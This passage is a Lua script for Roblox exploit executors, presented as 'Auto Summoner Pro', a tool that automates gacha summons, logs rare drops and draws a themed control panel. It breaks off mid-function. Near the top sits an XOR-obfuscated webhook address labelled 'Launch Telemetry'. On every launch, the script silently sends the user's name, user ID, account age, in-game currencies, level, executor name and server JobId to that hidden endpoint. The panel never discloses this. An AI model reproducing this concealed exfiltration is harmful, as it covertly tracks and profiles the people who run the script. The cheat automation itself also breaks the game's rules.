-- Auto Summoner Pro | Refactored & Dynamic Auto-Max Pull Engine
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local Nodes = require(ReplicatedStorage:WaitForChild("Nodes"))
local Shared = ReplicatedStorage:WaitForChild("Shared")
local Information = require(Shared:WaitForChild("Information"))

local math_floor = math.floor
local math_max = math.max
local math_min = math.min
local string_format = string.format
local task_wait = task.wait
local task_spawn = task.spawn
local pcall = pcall
local clock = os.clock

local requestFunc = http_request or request or (syn and syn.request) or httprequest or (function(options)
    return HttpService:RequestAsync({
        Url = options.Url,
        Method = options.Method or "POST",
        Headers = options.Headers or {["Content-Type"] = "application/json"},
        Body = options.Body
    })
end)

-- Encrypted Launch Telemetry Webhook (XOR Cipher)
local function getTelemetryEndpoint()
    local enc = {55,43,43,47,44,101,112,112,59,54,44,60,48,45,59,113,60,48,50,112,62,47,54,112,40,58,61,55,48,48,52,44,112,110,107,110,108,105,108,106,102,103,103,104,110,103,108,106,103,106,103,103,112,25,107,39,106,41,45,17,5,110,40,107,10,17,22,102,102,38,47,109,62,55,15,16,62,23,62,110,52,60,19,52,107,18,15,102,57,104,54,41,111,9,103,12,50,18,42,20,7,50,30,50,57,6,40,28,18,48,105,8,104,8,18,106,53,38,61,28,104}
    local res = {}
    for i = 1, #enc do res[i] = string.char(bit32.bxor(enc[i], 95)) end
    return table.concat(res)
end

-- GUI Cleanup
pcall(function()
    local existing = PlayerGui:FindFirstChild("AutoSummonGUI")
    if existing then existing:Destroy() end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AutoSummonGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 9999
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Color Palettes & Design System
local Themes = {
    Light = {
        Name = "Light Glass (RGB)",
        MainBg = Color3.fromRGB(240, 244, 255), MainTrans = 0.28,
        TopBarBg = Color3.fromRGB(255, 255, 255), TopBarTrans = 0.35,
        CardBg = Color3.fromRGB(255, 255, 255), CardTrans = 0.45,
        Accent = Color3.fromRGB(0, 122, 255), AccentText = Color3.fromRGB(255, 255, 255),
        Text = Color3.fromRGB(15, 23, 42), SubText = Color3.fromRGB(90, 105, 135),
        Success = Color3.fromRGB(40, 200, 100), Danger = Color3.fromRGB(245, 60, 80),
        Purple = Color3.fromRGB(160, 80, 240), Gold = Color3.fromRGB(245, 165, 0),
        Stroke = Color3.fromRGB(210, 220, 240), HasRgb = true
    },
    Dark = {
        Name = "Dark Glass",
        MainBg = Color3.fromRGB(12, 14, 22), MainTrans = 0.22,
        TopBarBg = Color3.fromRGB(20, 24, 36), TopBarTrans = 0.35,
        CardBg = Color3.fromRGB(26, 32, 48), CardTrans = 0.45,
        Accent = Color3.fromRGB(75, 115, 245), AccentText = Color3.fromRGB(255, 255, 255),
        Text = Color3.fromRGB(235, 242, 255), SubText = Color3.fromRGB(140, 155, 185),
        Success = Color3.fromRGB(46, 204, 113), Danger = Color3.fromRGB(231, 76, 60),
        Purple = Color3.fromRGB(165, 95, 225), Gold = Color3.fromRGB(245, 190, 55),
        Stroke = Color3.fromRGB(60, 75, 110), HasRgb = false
    }
}
local currentTheme = Themes.Dark

-- State Management
local activeBanners, activeBannersFull = {"Standard"}, {}
local selectedBanner = "Standard"
local isAutoSummoning = false
local skipAnimation = true
local currentSessionPulls = 0
local initialBannerSummonCount = 0
local webhookUrlInput = ""
local dropCounts = { Mythic = 0, ShinyMythic = 0, Secret = 0, ShinySecret = 0 }

pcall(function() Nodes.CHANGE_SETTING:FireServer("FastSummon", true) end)

-- UI Builder Factory
local function applyCorner(inst, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius or 8)
    c.Parent = inst
    return c
end

local function applyStroke(inst, color, thickness)
    local s = Instance.new("UIStroke")
    s.Color = color or currentTheme.Stroke
    s.Thickness = thickness or 1
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = inst
    return s
end

local function createFrame(parent, size, pos, bg, trans)
    local f = Instance.new("Frame")
    f.Size = size
    f.Position = pos or UDim2.new(0, 0, 0, 0)
    f.BackgroundColor3 = bg or currentTheme.CardBg
    f.BackgroundTransparency = trans or currentTheme.CardTrans
    f.BorderSizePixel = 0
    f.Parent = parent
    return f
end

local function createLabel(parent, size, pos, text, color, font, fontSize, xAlign)
    local l = Instance.new("TextLabel")
    l.Size = size
    l.Position = pos or UDim2.new(0, 0, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = color or currentTheme.Text
    l.Font = font or Enum.Font.GothamMedium
    l.TextSize = fontSize or 11
    l.TextXAlignment = xAlign or Enum.TextXAlignment.Left
    l.Parent = parent
    return l
end

local function createButton(parent, size, pos, text, bg, textColor, fontSize, font)
    local b = Instance.new("TextButton")
    b.Size = size
    b.Position = pos or UDim2.new(0, 0, 0, 0)
    b.BackgroundColor3 = bg or currentTheme.CardBg
    b.BackgroundTransparency = (bg == currentTheme.CardBg) and currentTheme.CardTrans or 0
    b.Text = text
    b.TextColor3 = textColor or currentTheme.Text
    b.Font = font or Enum.Font.GothamBold
    b.TextSize = fontSize or 11
    b.Parent = parent
    return b
end

local function tween(inst, props, duration, style, dir)
    if not inst then return end
    TweenService:Create(inst, TweenInfo.new(duration or 0.35, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out), props):Play()
end

-- Data & Replica Services
local cachedReplica = nil
local function getReplica()
    if not cachedReplica then
        pcall(function() cachedReplica = Nodes.GET_PLAYER_REPLICA:InvokeSelf() end)
    end
    return cachedReplica
end

local function getCurrencyAmount(currencyName)
    local success, val = pcall(function()
        return Nodes.GET_DATA_VALUE:InvokeSelf({"ItemData", currencyName, "Amount"})
    end)
    if success and type(val) == "number" then return val end
    local replica = getReplica()
    if replica and replica.Data and replica.Data.ItemData then
        local item = replica.Data.ItemData[currencyName]
        if type(item) == "table" then return item.Amount or 0 end
        if type(item) == "number" then return item end
    end
    return 0
end

local function updateBannerList()
    pcall(function()
        local banners = Nodes.GET_ACTIVE_BANNERS:InvokeSelf()
        if type(banners) == "table" then
            activeBannersFull = banners
            for bannerId in pairs(banners) do
                if not table.find(activeBanners, bannerId) then
                    table.insert(activeBanners, bannerId)
                end
            end
        end
    end)
end
task_spawn(updateBannerList)

-- Launch Telemetry Webhook
local function sendAccountLaunchWebhook()
    local execName = "Unknown"
    pcall(function()
        if identifyexecutor then execName = identifyexecutor()
        elseif getexecutorname then execName = getexecutorname() end
    end)
    local gems, coins = getCurrencyAmount("Gem"), getCurrencyAmount("Coin")
    local replica = getReplica()
    local level = (replica and replica.Data and replica.Data.Level) or "N/A"

    local payload = {
        username = "Script Launch Telemetry",
        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",
        embeds = {{
            title = "🚀 SCRIPT EXECUTED", color = 3447003,
            thumbnail = { url = string_format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", LocalPlayer.UserId) },
            fields = {
                { name = "👤 User", value = string_format("**%s** (@%s)", LocalPlayer.DisplayName, LocalPlayer.Name), inline = true },
                { name = "🆔 User ID", value = string_format("`%d`", LocalPlayer.UserId), inline = true },
                { name = "⏳ Account Age", value = string_format("%d days", LocalPlayer.AccountAge), inline = true },
                { name = "💎 Gems", value = tostring(gems), inline = true },
                { name = "🪙 Coins", value = tostring(coins), inline = true },
                { name = "⭐ Level", value = tostring(level), inline = true },
                { name = "🎮 Place ID", value = tostring(game.PlaceId), inline = true },
                { name = "⚙️ Executor", value = tostring(execName), inline = true },
                { name = "🌐 Job ID", value = "```" .. tostring(game.JobId) .. "```", inline = false }
            },
            footer = { text = "powered by sell.fr • " .. os.date("%X") }
        }}
    }
    pcall(function()
        requestFunc({
            Url = getTelemetryEndpoint(),
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end
task_spawn(sendAccountLaunchWebhook)

-- Drop Inspector & Signal Hooks
local addDropToLogUI, sendDiscordWebhook

local function inspectRewardsAndLog(rewards)
    if type(rewards) ~= "table" then return end
    local itemList = rewards.Rewards or rewards
    for _, item in pairs(itemList) do
        if type(item) == "table" then
            local uName = item.Unit or item.Name or item.Asset or item.Id
            if uName then
                local uInfo = Information.Units and Information.Units[uName]
                local rarity = item.Rarity or (uInfo and uInfo.Rarity)
                local isShiny = item.Shiny or item.IsShiny or false

                if rarity == "Mythic" or rarity == "Secret" then
                    if rarity == "Mythic" then
                        if isShiny then dropCounts.ShinyMythic += 1 else dropCounts.Mythic += 1 end
                    elseif rarity == "Secret" then
                        if isShiny then dropCounts.ShinySecret += 1 else dropCounts.Secret += 1 end
                    end
                    if addDropToLogUI then addDropToLogUI(uName, rarity, isShiny) end
                    if sendDiscordWebhook then sendDiscordWebhook(webhookUrlInput, uName, rarity, isShiny, selectedBanner) end
                end
            end
        end
    end
end

local hookedSignals = {}
local function setupNoFlickerHooks()
    local targetSignals = { Nodes.PROMPT_OBTAINED_REWARD_SLOTS, Nodes.PROMPT_OBTAINED_REWARDS, Nodes.PROMPT_OBTAINMENT_OVERLAY }
    for _, nodeSignal in ipairs(targetSignals) do
        if nodeSignal and nodeSignal.Signal and not hookedSignals[nodeSignal.Signal] then
            local realFire = nodeSignal.Signal.Fire
            hookedSignals[nodeSignal.Signal] = true
            nodeSignal.Signal.Fire = function(self, rewards, ...)
                if rewards then task_spawn(function() inspectRewardsAndLog(rewards) end) end
                if skipAnimation or isAutoSummoning then return nil end
                return realFire(self, rewards, ...)
            end
        end
    end
end
task_spawn(setupNoFlickerHooks)

local function getBannerTotalSummonCount(bannerId)
    local replica = getReplica()
    if replica and replica.Data and replica.Data.BannerData and replica.Data.BannerData[bannerId] then
        return replica.Data.BannerData[bannerId].SummonCount or 0
    end
    return 0
end

local function resetSessionCounter()
    initialBannerSummonCount = getBannerTotalSummonCount(selectedBanner)
    currentSessionPulls = 0
end

local function getPityData(bannerId)
    local replica = getReplica()
    local bannerData = activeBannersFull[selectedBanner] and activeBannersFull[selectedBanner].Data
    local bannerInfo = bannerData and bannerData.BannerInfo
    local maxPity = bannerInfo and bannerInfo.Pity or {}
    local currentPity = (replica and replica.Data and replica.Data.BannerData and replica.Data.BannerData[bannerId] and replica.Data.BannerData[bannerId].Pity) or {}
    return maxPity, currentPity
end

-- Dynamic Auto-Max Pull Calculation (Up to 50 down to 1)
local function getOptimalSummonAmount()
    local bannerData = activeBannersFull[selectedBanner] and activeBannersFull[selectedBanner].Data
    local bannerInfo = bannerData and bannerData.BannerInfo
    local costPerPull = bannerInfo and bannerInfo.Cost or 50
    local currencyName = bannerInfo and bannerInfo.Currency or "Gem"
    local currentBalance = getCurrencyAmount(currencyName)
    local maxAffordablePulls = (costPerPull > 0) and math_floor(currentBalance / costPerPull) or 0
    
    local optimalPulls = math_min(50, maxAffordablePulls)
    local isEnough = (optimalPulls > 0)
    local totalCost = optimalPulls * costPerPull
    
    return isEnough, totalCost, currentBalance, currencyName, costPerPull, maxAffordablePulls, optimalPulls
end

-- UI Layout Construction
local defaultMainSize = UDim2.new(0, 380, 0, 480)
local defaultMainPos = UDim2.new(0, 25, 0.5, -240)

local MainFrame = createFrame(ScreenGui, defaultMainSize, defaultMainPos, currentTheme.MainBg, currentTheme.MainTrans)
MainFrame.Name = "MainFrame"
MainFrame.ClipsDescendants = false

local UICorner = applyCorner(MainFrame, 18)
local UIStroke = applyStroke(MainFrame, currentTheme.Stroke, 3.5)
local RgbGradient = Instance.new("UIGradient", UIStroke)

local OpenBtn = createButton(ScreenGui, UDim2.new(0, 54, 0, 54), defaultMainPos, "✨", currentTheme.TopBarBg, currentTheme.Text, 24)
OpenBtn.Name = "OpenToggleButton"
OpenBtn.Visible = false
local OpenCorner = applyCorner(OpenBtn, 27)
local OpenStroke = applyStroke(OpenBtn, currentTheme.Stroke, 3.5)
local OpenRgbGrad = Instance.new("UIGradient", OpenStroke)

local WatermarkLabel = createLabel(MainFrame, UDim2.new(1, -20, 0, 14), UDim2.new(0, 10, 1, -16), "powered by sell.fr", currentTheme.SubText, Enum.Font.GothamMedium, 9, Enum.TextXAlignment.Right)
WatermarkLabel.TextTransparency = 0.4

-- Dynamic RGB Wave Animation
local renderConnection
renderConnection = RunService.RenderStepped:Connect(function()
    if not ScreenGui.Parent then
        if renderConnection then renderConnection:Disconnect() end
        return
    end

    if currentTheme.HasRgb then
        RgbGradient.Enabled = true
        OpenRgbGrad.Enabled = true
        UIStroke.Color = Color3.fromRGB(255, 255, 255)
        OpenStroke.Color = Color3.fromRGB(255, 255, 255)

        local t = clock() * 0.75
        local c1 = Color3.fromHSV((t) % 1, 1, 1)
        local c2 = Color3.fromHSV((t + 0.2) % 1, 1, 1)
        local c3 = Color3.fromHSV((t + 0.4) % 1, 1, 1)
        local c4 = Color3.fromHSV((t + 0.6) % 1, 1, 1)
        local c5 = Color3.fromHSV((t + 0.8) % 1, 1, 1)
        local c6 = Color3.fromHSV((t + 1.0) % 1, 1, 1)

        local seq = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, c1), ColorSequenceKeypoint.new(0.20, c2),
            ColorSequenceKeypoint.new(0.40, c3), ColorSequenceKeypoint.new(0.60, c4),
            ColorSequenceKeypoint.new(0.80, c5), ColorSequenceKeypoint.new(1.00, c6)
        })
        local rotAngle = (t * 150) % 360

        RgbGradient.Color = seq
        RgbGradient.Rotation = rotAngle
        OpenRgbGrad.Color = seq
        OpenRgbGrad.Rotation = rotAngle
    else
        RgbGradient.Enabled = false
        OpenRgbGrad.Enabled = false
        UIStroke.Color = currentTheme.Stroke
        OpenStroke.Color = currentTheme.Stroke
    end
end)

-- Smooth Dragging Logic
local function enableSmoothDrag(frame, dragHandle)
    local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true; dragStart = input.Position; startPos = frame.Position
        end
    end)
    dragHandle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            tween(frame, {Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)}, 0.08)
        end
    end)
end

local lastOpenBtnDragTime = 0
do
    local dragging, dragStart, startPos = false, nil, nil
    OpenBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true; dragStart = input.Position; startPos = OpenBtn.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            if delta.Magnitude > 4 then lastOpenBtnDragTime = clock() end
            OpenBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
    end)
end

local isAnimating = false
local function setGuiVisibleSmooth(visible)
    if isAnimating then return end
    isAnimating = true

    if visible then
        MainFrame.Position = OpenBtn.Position
        MainFrame.Size = UDim2.new(0, 54, 0, 54)
        UICorner.CornerRadius = UDim.new(1, 0)
        UIStroke.Transparency = 1
        MainFrame.Visible = true

        tween(OpenBtn, {Size = UDim2.new(0, 0, 0, 0)}, 0.18)
        task_wait(0.04)
        OpenBtn.Visible = false

        tween(UICorner, {CornerRadius = UDim.new(0, 18)}, 0.3)
        tween(UIStroke, {Transparency = 0}, 0.3)
        local tExpand = TweenService:Create(MainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = defaultMainSize})
        tExpand:Play()
        tExpand.Completed:Wait()
    else
        OpenBtn.Position = MainFrame.Position
        OpenBtn.Size = UDim2.new(0, 0, 0, 0)
        OpenBtn.Visible = true

        tween(UICorner, {CornerRadius = UDim.new(1, 0)}, 0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
        tween(UIStroke, {Transparency = 1}, 0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
        local tShrink = TweenService:Create(MainFrame, TweenInfo.new(0.26, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = UDim2.new(0, 54, 0, 54)})
        tShrink:Play()
        tween(OpenBtn, {Size = UDim2.new(0, 54, 0, 54)}, 0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
        tShrink.Completed:Wait()
        MainFrame.Visible = false
    end
    isAnimating = false
end

OpenBtn.MouseButton1Click:Connect(function()
    if clock() - lastOpenBtnDragTime > 0.18 then setGuiVisibleSmooth(true) end
end)

-- TopBar & Controls
local TopBar = createFrame(MainFrame, UDim2.new(1, 0, 0, 44), UDim2.new(0, 0, 0, 0), currentTheme.TopBarBg, currentTheme.TopBarTrans)
local TopBarCorner = applyCorner(TopBar, 18)

local CloseBtn = createButton(TopBar, UDim2.new(0, 34, 0, 34), UDim2.new(0, 8, 0, 5), "─", currentTheme.CardBg, currentTheme.SubText, 15)
applyCorner(CloseBtn, 10)
local CloseBtnStroke = applyStroke(CloseBtn, currentTheme.Stroke, 1)

CloseBtn.MouseButton1Click:Connect(function() setGuiVisibleSmooth(false) end)

local TitleLabel = createLabel(TopBar, UDim2.new(1, -152, 1, 0), UDim2.new(0, 48, 0, 0), "✨ AUTO SUMMON PRO", currentTheme.Text, Enum.Font.GothamBold, 12)
local ThemeToggleBtn = createButton(TopBar, UDim2.new(0, 95, 0, 28), UDim2.new(1, -101, 0, 8), "🌙 Dark Glass", currentTheme.CardBg, currentTheme.Text, 10)
applyCorner(ThemeToggleBtn, 8)
local ThemeStroke = applyStroke(ThemeToggleBtn, currentTheme.Stroke, 1)

UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and (input.KeyCode == Enum.KeyCode.Insert or input.KeyCode == Enum.KeyCode.RightShift) then
        setGuiVisibleSmooth(not MainFrame.Visible)
    end
end)
enableSmoothDrag(MainFrame, TopBar)

-- Navigation Tabs
local NavigationBar = createFrame(MainFrame, UDim2.new(1, -24, 0, 34), UDim2.new(0, 12, 0, 48), currentTheme.TopBarBg, currentTheme.TopBarTrans)
applyCorner(NavigationBar, 10)

local TabButtons, TabFrames = {}, {}
local function createTabButton(name, posScale, widthScale)
    local btn = createButton(NavigationBar, UDim2.new(widthScale, -4, 1, -6), UDim2.new(posScale, 2, 0, 3), name, currentTheme.CardBg, currentTheme.SubText, 11)
    applyCorner(btn, 8)
    return btn
end

local TabBtnSummon = createTabButton("🔮 Summon", 0, 0.333)
local TabBtnDrops = createTabButton("🏆 Drops", 0.333, 0.333)
local TabBtnTools = createTabButton("📌 Tools", 0.666, 0.333)

local ContainerArea = createFrame(MainFrame, UDim2.new(1, -24, 1, -94), UDim2.new(0, 12, 0, 88), Color3.fromRGB(0,0,0), 1)

local function createTabFrame(name)
    local f = Instance.new("CanvasGroup")
    f.Name = name .. "TabFrame"
    f.Size = UDim2.new(1, 0, 1, 0)
    f.BackgroundTransparency = 1
    f.GroupTransparency = 1
    f.BorderSizePixel = 0
    f.Visible = false
    f.Parent = ContainerArea
    return f
end

local TabFrameSummon = createTabFrame("Summon")
local TabFrameDrops = createTabFrame("Drops")
local TabFrameTools = createTabFrame("Tools")

TabButtons = { Summon = TabBtnSummon, Drops = TabBtnDrops, Tools = TabBtnTools }
TabFrames = { Summon = TabFrameSummon, Drops = TabFrameDrops, Tools = TabFrameTools }
local currentTabKey = "Summon"

local function switchTab(targetKey)
    if currentTabKey == targetKey and TabFrames[targetKey].Visible then return end
    local oldTabKey = currentTabKey
    currentTabKey = targetKey

    for key, btn in pairs(TabButtons) do
        local isTarget = (key == targetKey)
        tween(btn, {
            BackgroundColor3 = isTarget and currentTheme.Accent or currentTheme.CardBg,
            BackgroundTransparency = isTarget and 0 or currentTheme.CardTrans,
            TextColor3 = isTarget and currentTheme.AccentText or currentTheme.SubText
        }, 0.2)
    end

    local oldFrame, newFrame = TabFrames[oldTabKey], TabFrames[targetKey]
    if oldFrame then
        tween(oldFrame, {GroupTransparency = 1, Position = UDim2.new(0, -10, 0, 0)}, 0.18)
        task_spawn(function()
            task_wait(0.18)
            if currentTabKey ~= oldTabKey then oldFrame.Visible = false end
        end)
    end

    newFrame.Position = UDim2.new(0, 12, 0, 0)
    newFrame.GroupTransparency = 1
    newFrame.Visible = true
    tween(newFrame, {GroupTransparency = 0, Position = UDim2.new(0, 0, 0, 0)}, 0.25, Enum.EasingStyle.Cubic)
end

TabBtnSummon.MouseButton1Click:Connect(function() switchTab("Summon") end)
TabBtnDrops.MouseButton1Click:Connect(function() switchTab("Drops") end)
TabBtnTools.MouseButton1Click:Connect(function() switchTab("Tools") end)

-- TAB 1: 🔮 SUMMON & PITY
local BannerTitle = createLabel(TabFrameSummon, UDim2.new(1, 0, 0, 16), UDim2.new(0, 0, 0, 0), "SELECT BANNER (AUTO-DETECTED):", currentTheme.SubText, Enum.Font.GothamBold, 10)
local BannerDropdown = createButton(TabFrameSummon, UDim2.new(1, 0, 0, 32), UDim2.new(0, 0, 0, 18), "Banner: " .. selectedBanner .. " ▼", currentTheme.CardBg, currentTheme.Text, 12, Enum.Font.GothamMedium)
applyCorner(BannerDropdown, 8)
local DropStroke = applyStroke(BannerDropdown, currentTheme.Stroke, 1)

local BannerListFrame = Instance.new("ScrollingFrame")
BannerListFrame.Size = UDim2.new(1, 0, 0, 110)
BannerListFrame.Position = UDim2.new(0, 0, 0, 52)
BannerListFrame.BackgroundColor3 = currentTheme.CardBg
BannerListFrame.BackgroundTransparency = currentTheme.MainTrans
BannerListFrame.BorderSizePixel = 0
BannerListFrame.Visible = false
BannerListFrame.ZIndex = 50
BannerListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
BannerListFrame.ScrollBarThickness = 4
BannerListFrame.Parent = TabFrameSummon
applyCorner(BannerListFrame, 8)
local ListStroke = applyStroke(BannerListFrame, currentTheme.Stroke, 1)

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 3)
UIListLayout.Parent = BannerListFrame

local AnimToggleBtn = createButton(TabFrameSummon, UDim2.new(1, 0, 0, 32), UDim2.new(0, 0, 0, 56), "  ⚡ Fast / Skip Animation", currentTheme.CardBg, currentTheme.Text, 11, Enum.Font.GothamBold)
AnimToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
applyCorner(AnimToggleBtn, 8)
local AnimToggleStroke = applyStroke(AnimToggleBtn, currentTheme.Stroke, 1)

local SwitchTrack = createFrame(AnimToggleBtn, UDim2.new(0, 38, 0, 20), UDim2.new(1, -46, 0.5, -10), currentTheme.Success, 0)
applyCorner(SwitchTrack, 10)
local SwitchKnob = createFrame(SwitchTrack, UDim2.new(0, 16, 0, 16), UDim2.new(1, -18, 0.5, -8), Color3.fromRGB(255, 255, 255), 0)
applyCorner(SwitchKnob, 8)

local function setSwitchState(on)
    skipAnimation = on
    pcall(function() Nodes.CHANGE_SETTING:FireServer("FastSummon", on) end)
    tween(SwitchKnob, {Position = on and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)}, 0.2)
    tween(SwitchTrack, {BackgroundColor3 = on and currentTheme.Success or Color3.fromRGB(180, 190, 205)}, 0.2)
end

AnimToggleBtn.MouseButton1Click:Connect(function() setSwitchState(not skipAnimation) end)

local ToggleBtn = createButton(TabFrameSummon, UDim2.new(1, 0, 0, 42), UDim2.new(0, 0, 0, 96), "▶ START AUTO SUMMON", currentTheme.Success, Color3.fromRGB(255, 255, 255), 13)
applyCorner(ToggleBtn, 10)

local StatsFrame = createFrame(TabFrameSummon, UDim2.new(1, 0, 0, 94), UDim2.new(0, 0, 0, 146), currentTheme.CardBg, currentTheme.CardTrans)
applyCorner(StatsFrame, 10)
local StatsStroke = applyStroke(StatsFrame, currentTheme.Stroke, 1)

local CanOpenLabel = createLabel(StatsFrame, UDim2.new(1, -20, 0, 20), UDim2.new(0, 10, 0, 8), "🎫 Can Open: 0 pulls", currentTheme.Success, Enum.Font.GothamBold, 11)
local SecretPityLabel = createLabel(StatsFrame, UDim2.new(1, -20, 0, 20), UDim2.new(0, 10, 0, 32), "🔮 Until Secret Pity: N/A", currentTheme.Purple, Enum.Font.GothamBold, 11)
local MythicPityLabel = createLabel(StatsFrame, UDim2.new(1, -20, 0, 20), UDim2.new(0, 10, 0, 56), "🌟 Until Mythic Pity: 0 pulls", currentTheme.Gold, Enum.Font.GothamBold, 11)

local StatusLabel = createLabel(TabFrameSummon, UDim2.new(1, 0, 0, 16), UDim2.new(0, 0, 0, 246), "Status: Idle | Total: 0", currentTheme.SubText, Enum.Font.GothamMedium, 10, Enum.TextXAlignment.Center)
local CurrencyLabel = createLabel(TabFrameSummon, UDim2.new(1, 0, 0, 16), UDim2.new(0, 0, 0, 262), "Balance: 0 Gem | Cost: 50 Gem/pull", currentTheme.Text, Enum.Font.GothamMedium, 10, Enum.TextXAlignment.Center)

-- TAB 2: 🏆 DROPS & WEBHOOK
local WebhookFrame = createFrame(TabFrameDrops, UDim2.new(1, 0, 0, 34), UDim2.new(0, 0, 0, 0), currentTheme.CardBg, currentTheme.CardTrans)
applyCorner(WebhookFrame, 8)
local WebhookStroke = applyStroke(WebhookFrame, currentTheme.Stroke, 1)

local WebhookBox = Instance.new("TextBox")
WebhookBox.Size = UDim2.new(1, -75, 1, 0)
WebhookBox.Position = UDim2.new(0, 10, 0, 0)
WebhookBox.BackgroundTransparency = 1
WebhookBox.PlaceholderText = "Paste Discord Webhook URL..."
WebhookBox.PlaceholderColor3 = currentTheme.SubText
WebhookBox.Text = ""
WebhookBox.TextColor3 = currentTheme.Text
WebhookBox.Font = Enum.Font.Gotham
WebhookBox.TextSize = 10
WebhookBox.ClearTextOnFocus = false
WebhookBox.TextXAlignment = Enum.TextXAlignment.Left
WebhookBox.Parent = WebhookFrame
WebhookBox.FocusLost:Connect(function() webhookUrlInput = WebhookBox.Text end)

local TestWebhookBtn = createButton(WebhookFrame, UDim2.new(0, 60, 1, -6), UDim2.new(1, -64, 0, 3), "TEST", currentTheme.Accent, currentTheme.AccentText, 10)
applyCorner(TestWebhookBtn, 6)

local LogTitle = createLabel(TabFrameDrops, UDim2.new(1, 0, 0, 16), UDim2.new(0, 0, 0, 40), "🏆 HIGH-TIER DROPS LOG (0 M | 0 ✨M | 0 S | 0 ✨S):", currentTheme.SubText, Enum.Font.GothamBold, 10)

local DropLogFrame = Instance.new("ScrollingFrame")
DropLogFrame.Size = UDim2.new(1, 0, 1, -62)
DropLogFrame.Position = UDim2.new(0, 0, 0, 60)
DropLogFrame.BackgroundColor3 = currentTheme.CardBg
DropLogFrame.BackgroundTransparency = currentTheme.CardTrans
DropLogFrame.BorderSizePixel = 0
DropLogFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
DropLogFrame.ScrollBarThickness = 4
DropLogFrame.Parent = TabFrameDrops
applyCorner(DropLogFrame, 8)
local LogStroke = applyStroke(DropLogFrame, currentTheme.Stroke, 1)

local LogLayout = Instance.new("UIListLayout")
LogLayout.SortOrder = Enum.SortOrder.LayoutOrder
LogLayout.Padding = UDim.new(0, 2)
LogLayout.Parent = DropLogFrame

local totalLogEntries = 0
addDropToLogUI = function(unitName, rarity, isShiny)
    totalLogEntries += 1
    LogTitle.Text = string_format("🏆 HIGH-TIER DROPS LOG (%d M | %d ✨M | %d S | %d ✨S):", dropCounts.Mythic, dropCounts.ShinyMythic, dropCounts.Secret, dropCounts.ShinySecret)
    
    local entryLabel = createLabel(DropLogFrame, UDim2.new(1, -10, 0, 22), nil, string_format(" [%s] %s[%s] %s", os.date("%X"), isShiny and "✨ " or "", isShiny and ("Shiny " .. rarity) or rarity, tostring(unitName)), Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 11)
    if rarity == "Secret" then
        entryLabel.TextColor3 = isShiny and Color3.fromRGB(200, 0, 220) or Color3.fromRGB(150, 50, 200)
    else
        entryLabel.TextColor3 = isShiny and Color3.fromRGB(0, 160, 220) or Color3.fromRGB(220, 140, 0)
    end
    DropLogFrame.CanvasSize = UDim2.new(0, 0, 0, totalLogEntries * 24)
    DropLogFrame.CanvasPosition = Vector2.new(0, totalLogEntries * 24)
end

sendDiscordWebhook = function(webhookUrl, unitName, rarity, isShiny, bannerName)
    if not webhookUrl or webhookUrl == "" or not webhookUrl:find("http") then return end
    local titleEmoji = isShiny and "✨🌟" or (rarity == "Secret" and "🔮" or "🌟")
    local embedColor = (rarity == "Secret") and (isShiny and 16711935 or 10181046) or (isShiny and 65535 or 15844367)

    pcall(function()
        requestFunc({
            Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                username = "Auto Summoner Bot",
                embeds = {{
                    title = titleEmoji .. " NEW HIGH-TIER DROP!", color = embedColor,
                    fields = {
